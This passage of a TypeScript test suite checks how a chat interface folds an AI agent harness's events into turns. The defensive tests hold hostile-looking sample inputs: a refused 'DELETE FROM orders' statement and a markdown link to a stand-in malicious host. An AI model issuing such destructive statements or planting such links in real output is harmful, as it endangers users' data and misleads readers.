    foldHarnessEvent(state, { event_type: "message.created", message_id: "u1", role: "user" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    // Provider failure arrives ONLY via turn.finished, then opencode is torn down.
    foldHarnessEvent(state, {
      event_type: "turn.finished",
      stop_reason: "error",
      error_detail: "Provider returned HTTP 500.",
    });
    foldHarnessEvent(state, {
      event_type: "session.status_changed",
      status: "error",
      detail: "agent exited unexpectedly (rc=-15)",
    });

    const errorParts = cloneTurns(state)
      .flatMap((t) => t.parts)
      .filter((p) => p.kind === "system" && p.tone === "error");
    expect(errorParts).toHaveLength(0); // genuine error shows in the turn summary, not as a separate error turn
    const summary = cloneTurns(state)
      .flatMap((t) => t.parts)
      .find((p) => p.kind === "turn_summary");
    expect(summary).toMatchObject({ errorDetail: "Provider returned HTTP 500." });
    expect(JSON.stringify(cloneTurns(state))).not.toContain("rc=-15");
  });

  it("folds a refusal-then-teardown stream into exactly one polished error", () => {
    const state = createConversationFoldState();

    for (const event of NO_CREDIT_THEN_TEARDOWN) foldHarnessEvent(state, event);

    const turns = cloneTurns(state);
    const errorParts = turns
      .flatMap((turn) => turn.parts)
      .filter((part) => part.kind === "system" && part.tone === "error");
    expect(errorParts).toHaveLength(1);
    expect(errorParts[0]).toMatchObject({ text: REFUSED });
    const serialized = JSON.stringify(turns);
    expect(serialized).not.toContain("rc=-15");
    expect(serialized).not.toContain("agent exited unexpectedly");
    // The harness name must never leak into rendered turns.
    expect(serialized.toLowerCase()).not.toContain("opencode");
    // The user's prompt survives exactly once (the daemon's message.created user).
    expect(turns.filter((turn) => turn.author === "user")).toHaveLength(1);
  });

  it("folds a real OpenCode replay without lifecycle rows or leftovers", () => {
    const state = createConversationFoldState();

    for (const event of REAL_OPENCODE_EVENTS) foldHarnessEvent(state, event);

    const turns = cloneTurns(state);
    expect(turns).toHaveLength(2);
    expect(turns[0]).toMatchObject({
      author: "user",
      parts: [{ kind: "text", text: "say hello", streaming: false }],
    });
    expect(turns[1]).toMatchObject({
      author: "assistant",
      status: "done",
      parts: [{ kind: "text", text: "Hello from opencode", streaming: false }],
    });
    const serialized = JSON.stringify(turns);
    expect(serialized).not.toContain("session.next.agent.switched");
    expect(serialized).not.toContain("session.next.model.switched");
    expect(serialized).not.toContain("session.updated");
    expect(serialized).not.toContain("session.status_changed");
    expect(serialized).not.toContain("step-start");
    expect(serialized).not.toContain("step-finish");
    expect(serialized).not.toContain("message.completed");
    expect(turns.flatMap((turn) => turn.parts).some((part) => part.streaming)).toBe(false);
    expect(
      turns
        .flatMap((turn) => turn.parts)
        .filter(
          (part) => part.kind === "text" || part.kind === "thinking" || part.kind === "system",
        )
        .every((part) => part.text.trim().length > 0),
    ).toBe(true);
  });

  it("keeps but dims prior turns on conversation.cleared", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "u1", role: "user" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "u1",
      part: { part_id: "p1", message_id: "u1", type: "text", text: "before" },
    });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: { part_id: "a1-text", message_id: "a1", type: "text", text: "answer" },
    });

    foldHarnessEvent(state, { event_type: "conversation.cleared" });

    // The history survives — dimmed, not deleted — so a remount that REPLAYS
    // this event from disk reproduces the greyed scrollback instead of the
    // empty "start a chat" screen.
    const cleared = cloneTurns(state);
    expect(cleared.filter((turn) => turn.cleared).map((turn) => turn.id)).toEqual(["u1", "a1"]);
    // A bright "Conversation cleared" command card is appended as the boundary
    // marker — persisted via the SAME event, so it survives reopen.
    const card = cleared[cleared.length - 1];
    expect(card.cleared).toBeUndefined();
    expect(card.parts[0]).toMatchObject({
      kind: "command",
      command: "clear",
      label: "Conversation cleared",
    });
    // A cleared conversation owes no response (the dimmed tail must not relight
    // the working indicator).
    expect(conversationAwaitsResponse(cleared)).toBe(false);

    // Post-clear turns start fresh ON TOP of the dimmed history — bright, and
    // the conversation is live again.
    foldHarnessEvent(state, { event_type: "message.created", message_id: "u2", role: "user" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "u2",
      part: { part_id: "p2", message_id: "u2", type: "text", text: "after" },
    });

    const after = cloneTurns(state);
    const u2 = after.find((turn) => turn.id === "u2");
    expect(u2?.cleared).toBeUndefined();
    expect(after[after.length - 1].id).toBe("u2");
    // The fresh user turn now awaits a response again.
    expect(conversationAwaitsResponse(after)).toBe(true);
  });

  it("a second conversation.cleared dims the first cleared card", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "conversation.cleared" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "u1", role: "user" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "u1",
      part: { part_id: "p1", message_id: "u1", type: "text", text: "after first clear" },
    });
    foldHarnessEvent(state, { event_type: "conversation.cleared" });

    const turns = cloneTurns(state);
    const clearCards = turns.filter((turn) => turn.parts[0]?.kind === "command");
    expect(clearCards).toHaveLength(2);
    // The earlier card (now just another turn above) is dimmed by the later
    // clear; only the newest card stays bright.
    expect(clearCards[0].cleared).toBe(true);
    expect(clearCards[1].cleared).toBeUndefined();
  });

  it("ignores a legacy command.result event", () => {
    // The daemon no longer emits command.result, but an OLDER chat's log may
    // still carry one — the fold must skip it gracefully, adding no card.
    const state = createConversationFoldState();
    foldHarnessEvent(state, {
      event_type: "command.result",
      command: "title",
      outcome_kind: "ok",
      payload: { action: "set", title: "Data sweep" },
      message: null,
    });
    expect(cloneTurns(state)).toEqual([]);
  });
});

describe("settleStaleInterrupts", () => {
  it("cancels a trailing assistant turn abandoned mid-stream", async () => {
    const { settleStaleInterrupts } = await import("./harnessEventFold");
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "u1", role: "user" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "u1",
      part: { part_id: "u1-text", message_id: "u1", type: "text", text: "go" },
    });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "agent.message_chunk",
      message_id: "a1",
      part_id: "a1-text",
      text: "Half a sente",
    });

    settleStaleInterrupts(state);

    const turns = cloneTurns(state);
    const last = turns[turns.length - 1];
    // The daemon's in-flight stream died with the old process: the reopened
    // chat must not keep a blinking cursor or read as awaiting a response.
    expect(last.author).toBe("assistant");
    expect(last.status).toBe("cancelled");
    expect(last.parts.every((part) => !part.streaming)).toBe(true);
  });

  it("leaves a COMPLETED trailing assistant turn untouched", async () => {
    const { settleStaleInterrupts } = await import("./harnessEventFold");
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "agent.message_chunk",
      message_id: "a1",
      part_id: "a1-text",
      text: "Done.",
    });
    foldHarnessEvent(state, {
      event_type: "message.completed",
      message_id: "a1",
      time: "2026-06-11T00:00:00Z",
    });

    settleStaleInterrupts(state);

    const turns = cloneTurns(state);
    expect(turns[turns.length - 1].status).toBe("done");
    expect(turns[turns.length - 1].completedAt).toBe("2026-06-11T00:00:00Z");
  });
});

describe("revert.applied / tombstone.applied cursors", () => {
  function turn(
    state: ReturnType<typeof createConversationFoldState>,
    id: string,
    role: string,
    text: string,
  ): void {
    foldHarnessEvent(state, { event_type: "message.created", message_id: id, role });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: id,
      part: { part_id: `${id}-text`, message_id: id, type: "text", text },
    });
  }

  it("revert drops every turn after the cursor message", () => {
    const state = createConversationFoldState();
    turn(state, "u1", "user", "first");
    turn(state, "a1", "assistant", "reply 1");
    turn(state, "u2", "user", "second");
    turn(state, "a2", "assistant", "reply 2");
    expect(state.turns).toHaveLength(4);

    foldHarnessEvent(state, { event_type: "revert.applied", to_message_id: "a1" });
    expect(state.turns.map((t) => t.id)).toEqual(["u1", "a1"]);
    // Tracking for dropped turns is pruned (u2/a2 message ids gone).
    expect(state.messageToTurn.has("u2")).toBe(false);

    // Replaying the same cursor is a no-op (reopen-safe).
    foldHarnessEvent(state, { event_type: "revert.applied", to_message_id: "a1" });
    expect(state.turns).toHaveLength(2);
    // An unknown anchor is ignored (forward-compat).
    foldHarnessEvent(state, { event_type: "revert.applied", to_message_id: "nope" });
    expect(state.turns).toHaveLength(2);
  });

  it("revert with to_part_id drops the parts after it within the cursor turn", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    for (const pid of ["p1", "p2", "p3"]) {
      foldHarnessEvent(state, {
        event_type: "part.created",
        message_id: "a1",
        part: { part_id: pid, message_id: "a1", type: "text", text: pid },
      });
    }
    foldHarnessEvent(state, {
      event_type: "revert.applied",
      to_message_id: "a1",
      to_part_id: "p1",
    });
    expect(state.turns[0].parts.map((p) => p.id)).toEqual(["p1"]);
  });

  it("tombstone drops a whole turn by id and an individual part by id", () => {
    const state = createConversationFoldState();
    turn(state, "u1", "user", "keep me");
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: { part_id: "p-keep", message_id: "a1", type: "text", text: "fine" },
    });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: { part_id: "p-redact", message_id: "a1", type: "text", text: "SSN 123-45-6789" },
    });

    // Tombstone a single part (PII redaction) — its turn stays.
    foldHarnessEvent(state, { event_type: "tombstone.applied", event_ids: ["p-redact"] });
    expect(state.turns.find((t) => t.id === "a1")?.parts.map((p) => p.id)).toEqual(["p-keep"]);
    // Tombstone a whole turn by id.
    foldHarnessEvent(state, { event_type: "tombstone.applied", event_ids: ["u1"] });
    expect(state.turns.map((t) => t.id)).toEqual(["a1"]);
  });
});

describe("harnessEventFold — spawn_agent ↔ subagent.started binding", () => {
  function startTurn(state: ReturnType<typeof createConversationFoldState>): void {
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "t1" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
  }
  const spawnCall = (
    callId: string,
    prompt: string,
    agent = "explore",
    messageId = "a1",
  ): HarnessEvent => ({
    event_type: "tool.call",
    message_id: messageId,
    tool_call_id: callId,
    tool_name: "alkera_spawn_agent",
    tool_kind: "task",
    status: "running",
    input: { agent, prompt },
  });
  const started = (childId: string, prompt: string, agent = "explore"): HarnessEvent => ({
    event_type: "subagent.started",
    child_session_id: childId,
    agent_name: agent,
    prompt,
  });
  const spawnParts = (
    state: ReturnType<typeof createConversationFoldState>,
  ): ToolConversationPart[] =>
    cloneTurns(state)
      .flatMap((t) => t.parts)
      .filter(
        (p): p is ToolConversationPart => p.kind === "tool" && p.name === "alkera_spawn_agent",
      );

  it("routes parallel spawns to their own children by agent and prompt", () => {
    const state = createConversationFoldState();
    startTurn(state);
    foldHarnessEvent(state, spawnCall("c1", "map auth"));
    foldHarnessEvent(state, spawnCall("c2", "map billing"));
    // Starts arrive in the OPPOSITE order to the calls — each still binds to its own card.
    foldHarnessEvent(state, started("child-billing", "map billing"));
    foldHarnessEvent(state, started("child-auth", "map auth"));
    const byPrompt = Object.fromEntries(
      spawnParts(state).map((p) => [String(p.input?.prompt), p.childSessionId]),
    );
    expect(byPrompt).toEqual({ "map auth": "child-auth", "map billing": "child-billing" });
  });

  it("buffers a start that races ahead of its tool.call", () => {
    const state = createConversationFoldState();
    startTurn(state);
    // The start lands BEFORE the spawn's tool.call (a bus race) — nothing to bind yet...
    foldHarnessEvent(state, started("child-A", "map the auth flow"));
    expect(spawnParts(state)).toHaveLength(0);
    // ...then the tool.call arrives and the buffered child id binds to it.
    foldHarnessEvent(state, spawnCall("c1", "map the auth flow"));
    expect(spawnParts(state)[0].childSessionId).toBe("child-A");
  });

  it("two identical-brief spawns bind first-unbound, without colliding", () => {
    const state = createConversationFoldState();
    startTurn(state);
    foldHarnessEvent(state, spawnCall("c1", "explore the repo"));
    foldHarnessEvent(state, spawnCall("c2", "explore the repo"));
    foldHarnessEvent(state, started("child-1", "explore the repo"));
    foldHarnessEvent(state, started("child-2", "explore the repo"));
    const ids = spawnParts(state).map((p) => p.childSessionId);
    expect(ids).toHaveLength(2);
    expect(new Set(ids)).toEqual(new Set(["child-1", "child-2"]));
  });

  it("a same-brief re-spawn binds the most recent card", () => {
    const state = createConversationFoldState();
    // Turn 1 spawns "map auth" (its start hasn't arrived — still unbound)...
    startTurn(state);
    foldHarnessEvent(state, spawnCall("c1", "map auth"));
    // ...turn 2 re-spawns the IDENTICAL brief.
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "t2" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a2", role: "assistant" });
    foldHarnessEvent(state, spawnCall("c2", "map auth", "explore", "a2"));
    // The start binds the newest spawn (turn 2 / c2) — the one actually running now.
    foldHarnessEvent(state, started("child-new", "map auth"));
    const byCall = Object.fromEntries(spawnParts(state).map((p) => [p.callId, p.childSessionId]));
    expect(byCall).toEqual({ c1: undefined, c2: "child-new" });
  });

  it("clears buffered starts on conversation.cleared", () => {
    const state = createConversationFoldState();
    startTurn(state);
    // A start arrives with no spawn yet → buffered.
    foldHarnessEvent(state, started("stale-child", "map auth"));
    foldHarnessEvent(state, { event_type: "conversation.cleared" });
    // A fresh conversation reuses the same brief — it must NOT inherit the stale child.
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "t2" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a2", role: "assistant" });
    foldHarnessEvent(state, spawnCall("c2", "map auth", "explore", "a2"));
    expect(spawnParts(state).find((p) => p.callId === "c2")?.childSessionId).toBeUndefined();
  });

  it("an empty agent_name binds like explore", () => {
    const state = createConversationFoldState();
    startTurn(state);
    foldHarnessEvent(state, spawnCall("c1", "map auth")); // input.agent defaults to "explore"
    foldHarnessEvent(state, {
      event_type: "subagent.started",
      child_session_id: "child-A",
      agent_name: "",
      prompt: "map auth",
    });
    expect(spawnParts(state)[0].childSessionId).toBe("child-A");
  });
});

describe("summarizeSubagentActivity", () => {
  function childWithTools(
    tools: Array<{ name: string; status?: string; input?: Record<string, unknown> }>,
  ) {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "t" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    tools.forEach((tool, i) =>
      foldHarnessEvent(state, {
        event_type: "tool.call",
        message_id: "a1",
        tool_call_id: `c${i}`,
        tool_name: tool.name,
        tool_kind: tool.name === "bash" ? "terminal" : tool.name,
        status: tool.status ?? "completed",
        input: tool.input ?? {},
      }),
    );
    return state;
  }

  it("caps the live feed at 6 tool calls but counts every one", () => {
    const state = childWithTools(
      Array.from({ length: 9 }, (_, i) => ({ name: "read", input: { path: `f${i}.py` } })),
    );
    const activity = summarizeSubagentActivity(state);
    expect(activity.toolCount).toBe(9);
    expect(activity.recentTools).toHaveLength(6);
    // The LAST six, oldest→newest (newest at the bottom, like a mini transcript).
    expect(activity.recentTools.map((t) => t.detail)).toEqual([
      "f3.py",
      "f4.py",
      "f5.py",
      "f6.py",
      "f7.py",
      "f8.py",
    ]);
  });

  it("derives a short detail from path / command / query / pattern inputs", () => {
    const state = childWithTools([
      { name: "read", input: { path: "src/auth.py" } },
      { name: "bash", input: { command: "ls -la" } },
      { name: "sql.query", input: { query: "SELECT 1" } },
      { name: "grep", input: { pattern: "login(" } },
      { name: "list_agent_types", input: {} },
    ]);
    const details = summarizeSubagentActivity(state).recentTools.map((t) => t.detail);
    expect(details).toEqual(["src/auth.py", "ls -la", "SELECT 1", "login(", undefined]);
  });

  it("running tracks whether the child's turn is still in flight", () => {
    const running = childWithTools([{ name: "read", status: "running" }]);
    expect(summarizeSubagentActivity(running).running).toBe(true);
    foldHarnessEvent(running, {
      event_type: "turn.finished",
      stop_reason: "complete",
      time: "2026-06-14T00:00:00Z",
    });
    expect(summarizeSubagentActivity(running).running).toBe(false);
  });
});

describe("harnessEventFold background tool card (bgjob:)", () => {
  const findToolPart = (state: ReturnType<typeof createConversationFoldState>, callId: string) =>
    state.turns
      .flatMap((turn) => turn.parts)
      .find((part) => part.kind === "tool" && part.callId === callId) as
      | ToolConversationPart
      | undefined;

  it("folds a finished background card into its own completed turn", () => {
    const state = createConversationFoldState();
    // A prior exchange has completed → currentAssistantTurnId reset to null.
    foldHarnessEvent(state, { event_type: "message.created", message_id: "u1", role: "user" });
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "t1" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: { part_id: "a1-t", message_id: "a1", type: "text", text: "starting the query" },
    });
    foldHarnessEvent(state, { event_type: "turn.finished", turn_id: "t1" });
    const turnsBefore = state.turns.length;

    // The backgrounded sql.query finishes → the FINISH card (bgdone:) is a
    // self-contained ToolCall + ToolCallUpdate landing in its own turn at the tail.
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "bgdone:job_1",
      message_id: "",
      tool_name: "sql.query",
      input: { sql: "select 1" },
      status: "completed",
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "bgdone:job_1",
      status: "completed",
      output: JSON.stringify({ columns: ["a"], preview_rows: [[1]] }),
    });

    // Exactly ONE new turn carrying exactly ONE tool part (no orphan, no dupe).
    expect(state.turns.length).toBe(turnsBefore + 1);
    const card = findToolPart(state, "bgdone:job_1");
    expect(card).toBeDefined();
    expect(card!.name).toBe("sql.query");
    expect(card!.state).toBe("completed");
    expect(card!.output).toBeDefined();

    // CRUCIAL (the inverted-claim guard): the card turn did NOT become the current
    // assistant turn — so it can never capture the wake reply that follows.
    const cardTurn = state.turns.find((turn) => turn.parts.includes(card!))!;
    expect(state.currentAssistantTurnId).not.toBe(cardTurn.id);

    // The wake reply (a fresh assistant message + text) lands in its OWN turn, NOT
    // merged into the card turn.
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a2", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a2",
      part: { part_id: "a2-t", message_id: "a2", type: "text", text: "the query returned 1 row" },
    });
    const replyTurn = state.turns.find((turn) => turn.id === "a2");
    expect(replyTurn).toBeDefined();
    expect(replyTurn!.id).not.toBe(cardTurn.id);
    expect(cardTurn.parts.filter((part) => part.kind === "text")).toHaveLength(0);
  });

  it("a mid-turn background card never captures the live turn", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "t1" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
      part: { part_id: "a1-t", message_id: "a1", type: "text", text: "working" },
    });
    const liveTurnId = state.currentAssistantTurnId;
    expect(liveTurnId).toBe("a1");

    // A backgrounded bash finishes WHILE the foreground turn streams.
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "bgdone:job_2",
      message_id: "",
      tool_name: "bash",
      input: { command: "ls" },
      status: "completed",
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "bgdone:job_2",
      status: "completed",
      output: JSON.stringify({ output: "x\n", exit_code: 0 }),
    });

    // The live turn is untouched: still current, and the card is NOT inside it.
    expect(state.currentAssistantTurnId).toBe(liveTurnId);
    const liveTurn = state.turns.find((turn) => turn.id === liveTurnId)!;
    expect(
      liveTurn.parts.some((part) => part.kind === "tool" && part.callId === "bgdone:job_2"),
    ).toBe(false);

    // turn.finished's summary lands on the LIVE turn, never on the card turn.
    foldHarnessEvent(state, { event_type: "turn.finished", turn_id: "t1" });
    expect(liveTurn.parts.some((part) => part.kind === "turn_summary")).toBe(true);
    const card = findToolPart(state, "bgdone:job_2")!;
    const cardTurn = state.turns.find((turn) => turn.parts.includes(card))!;
    expect(cardTurn.id).not.toBe(liveTurnId);
    expect(cardTurn.parts.some((part) => part.kind === "turn_summary")).toBe(false);
  });
});

describe("harnessEventFold background lifecycle + suppression", () => {
  const allText = (state: ReturnType<typeof createConversationFoldState>) =>
    state.turns
      .flatMap((turn) => turn.parts)
      .filter((part) => part.kind === "text")
      .map((part) => (part as { text: string }).text)
      .join("\n");

  const toolPart = (state: ReturnType<typeof createConversationFoldState>, callId: string) =>
    state.turns
      .flatMap((turn) => turn.parts)
      .find((part) => part.kind === "tool" && part.callId === callId) as
      | ToolConversationPart
      | undefined;

  it("suppresses the model-only background wake", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "u1", role: "user" });
    foldHarnessEvent(state, {
      event_type: "part.started",
      message_id: "u1",
      part_id: "u1-t",
      part_type: "text",
      initial: {
        text:
          '<backgrounded_tool_finished job_id="j1" tool="bash" status="completed">' +
          "<result>{}</result></backgrounded_tool_finished>",
      },
    });
    expect(allText(state)).not.toContain("backgrounded_tool_finished");
  });

  it("suppresses a harness-issued turn such as the analyst verification pass", () => {
    // The runtime sends its own prompts in a <harness_turn> envelope; the model
    // acts on it, the user never sees it, and a real prompt is untouched.
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "u1", role: "user" });
    foldHarnessEvent(state, {
      event_type: "part.started",
      message_id: "u1",
      part_id: "u1-t",
      part_type: "text",
      initial: {
        text: '<harness_turn kind="verification">\nVERIFICATION PASS. Re-verify.\n</harness_turn>',
      },
    });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "u2", role: "user" });
    foldHarnessEvent(state, {
      event_type: "part.started",
      message_id: "u2",
      part_id: "u2-t",
      part_type: "text",
      initial: { text: "how many rows are active?" },
    });
    expect(allText(state)).not.toContain("harness_turn");
    expect(allText(state)).not.toContain("VERIFICATION PASS");
    expect(allText(state)).toContain("how many rows are active?");
  });

  it("drops the backgrounded bash stub card", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "t1" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    // The adapter's foreground bash(background=true) call + its {job_id, note} stub result.
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "adp1",
      message_id: "a1",
      tool_name: "alkera_bash",
      input: { command: "sleep 30" },
      status: "running",
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "adp1",
      status: "completed",
      output: JSON.stringify({
        job_id: "j1",
        note: "Running in the background",
        output: "",
        exit_code: null,
      }),
    });
    expect(toolPart(state, "adp1")).toBeUndefined();
  });

  it("keeps a foreground tool result that carries no job_id", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "turn.started", turn_id: "t1" });
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "fg1",
      message_id: "a1",
      tool_name: "alkera_bash",
      input: { command: "echo hi" },
      status: "running",
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "fg1",
      status: "completed",
      output: JSON.stringify({ output: "hi\n", exit_code: 0, job_id: "" }),
    });
    expect(toolPart(state, "fg1")).toBeDefined();
  });

  it("splits a background job into a start breadcrumb and a finish card", () => {
    const state = createConversationFoldState();
    // Submit → the START card opens running + marked background.
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "bgjob:j1",
      message_id: "",
      tool_name: "bash",
      input: { command: "sleep 30" },
      status: "running",
    });
    const opened = toolPart(state, "bgjob:j1")!;
    expect(opened.background).toBe(true);
    expect(opened.state).toBe("running");

    // Finish → the START card RESOLVES to completed with NO output (a breadcrumb)...
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "bgjob:j1",
      status: "completed",
    });
    const start = toolPart(state, "bgjob:j1")!;
    expect(start.state).toBe("completed");
    expect(start.output).toBeUndefined();

    // ...and the FINISH card (bgdone:) carries the result, marked background, in its
    // OWN separate turn (a distinct id → a new turn at the tail).
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "bgdone:j1",
      message_id: "",
      tool_name: "bash",
      input: { command: "sleep 30" },
      status: "completed",
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "bgdone:j1",
      status: "completed",
      output: JSON.stringify({ output: "done\n", exit_code: 0 }),
    });
    const finish = toolPart(state, "bgdone:j1")!;
    expect(finish.state).toBe("completed");
    expect(finish.background).toBe(true);
    expect(finish.output).toBeDefined();
    // The two cards live in DIFFERENT turns (start in place, finish at the tail).
    const startTurn = state.turns.find((t) => t.parts.includes(start))!;
    const finishTurn = state.turns.find((t) => t.parts.includes(finish))!;
    expect(startTurn.id).not.toBe(finishTurn.id);
  });

  it("the finish card's self-contained pair folds onto one card", () => {
    const state = createConversationFoldState();
    const tools = () => state.turns.flatMap((t) => t.parts).filter((p) => p.kind === "tool");
    // bgdone: terminal ToolCall(completed) + terminal update → one card with the result.
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "bgdone:j1",
      message_id: "",
      tool_name: "bash",
      input: { command: "ls" },
      status: "completed",
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "bgdone:j1",
      status: "completed",
      output: JSON.stringify({ output: "done\n", exit_code: 0 }),
    });
    expect(tools()).toHaveLength(1);
    expect((tools()[0] as ToolConversationPart).state).toBe("completed");
    expect((tools()[0] as ToolConversationPart).output).toBeDefined();
  });

  it("a late running frame never downgrades a finished card", () => {
    const state = createConversationFoldState();
    // Terminal update arrives FIRST (it raced the running frame), then the running frame.
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "bgdone:j1",
      status: "completed",
      output: JSON.stringify({ output: "done\n", exit_code: 0 }),
    });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "bgdone:j1",
      message_id: "",
      tool_name: "bash",
      input: { command: "ls" },
      status: "running",
    });
    const card = toolPart(state, "bgdone:j1")!;
    expect(card.state).toBe("completed"); // NOT downgraded to running
    expect(card.output).toBeDefined(); // result preserved
  });
});

describe("a daemon notice on a system message", () => {
  const notice = (text: string) => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, {
      event_type: "message.created",
      message_id: "note-1",
      role: "system",
    });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "note-1",
      // The daemon flags its own text `synthetic` — it is tooling-authored, not
      // the model speaking. That flag hides the model's steering injections; it
      // must not hide a line written FOR the reader.
      part: { part_id: "note-1-part", message_id: "note-1", type: "text", text, synthetic: true },
    });
    foldHarnessEvent(state, {
      event_type: "message.completed",
      message_id: "note-1",
      finish_reason: "stop",
    });
    return cloneTurns(state);
  };

  it("renders a refusal as a notice, not as suppressed steering", () => {
    const turns = notice(
      'This connection is read-only, so statements that modify data are refused.\n"DELETE FROM orders"',
    );
    expect(turns).toHaveLength(1);
    expect(turns[0].author).toBe("system");
    expect(turns[0].parts).toEqual([
      {
        id: "note-1-part",
        kind: "system",
        text: "This connection is read-only, so statements that modify data are refused.",
        detail: '"DELETE FROM orders"',
        tone: "info",
        streaming: false,
      },
    ]);
  });

  it("keeps the quoted statement as data, never as prose", () => {
    // Their rows are stored LLM output, so a statement can carry a markdown
    // link. It must survive as text on a `system` part (which renders as a text
    // node) and never as a `text` part (which renders as prose).
    const turns = notice(
      'I couldn\'t prove that query is read-only, so I won\'t run it.\n"[click](https://evil.example)"',
    );
    expect(turns[0].parts.every((part) => part.kind === "system")).toBe(true);
    expect(turns[0].parts[0]).toMatchObject({
      detail: '"[click](https://evil.example)"',
    });
  });

  it("carries no detail when the notice is one line", () => {
    const turns = notice("Saved 40 rows to result.");
    expect(turns[0].parts[0]).toEqual({
      id: "note-1-part",
      kind: "system",
      text: "Saved 40 rows to result.",
      detail: undefined,
      tone: "info",
      streaming: false,
    });
  });

  it("drops a blank notice", () => {
    expect(notice("   ")[0].parts).toEqual([]);
  });

  it("carries the publisher's cut size onto the tool part", () => {
    // A 50 MB tool result reaches the browser as a preview plus the figure the
    // publisher measured before it dropped the rest. Losing the figure here is
    // what leaves a shortened result looking whole on screen.
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "call-big",
      tool_name: "bash",
      status: "running",
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "call-big",
      status: "completed",
      output: "x".repeat(2048),
      truncated: true,
      truncated_bytes: 52_428_800,
    });
    const part = cloneTurns(state)
      .flatMap((turn) => turn.parts)
      .find((candidate) => candidate.kind === "tool");
    expect(part?.kind).toBe("tool");
    if (part?.kind === "tool") expect(part.truncatedBytes).toBe(52_428_800);
  });

  it("leaves an untruncated tool result with no cut size", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, { event_type: "message.created", message_id: "a1", role: "assistant" });
    foldHarnessEvent(state, {
      event_type: "tool.call",
      tool_call_id: "call-small",
      tool_name: "bash",
      status: "running",
    });
    foldHarnessEvent(state, {
      event_type: "tool.call_update",
      tool_call_id: "call-small",
      status: "completed",
      output: "a modest result",
    });
    const part = cloneTurns(state)
      .flatMap((turn) => turn.parts)
      .find((candidate) => candidate.kind === "tool");
    if (part?.kind === "tool") expect(part.truncatedBytes).toBeUndefined();
  });

  it("still suppresses a synthetic part on the model's own message", () => {
    const state = createConversationFoldState();
    foldHarnessEvent(state, {
      event_type: "message.created",
      message_id: "a1",
      role: "assistant",
    });
    foldHarnessEvent(state, {
      event_type: "part.created",
      message_id: "a1",
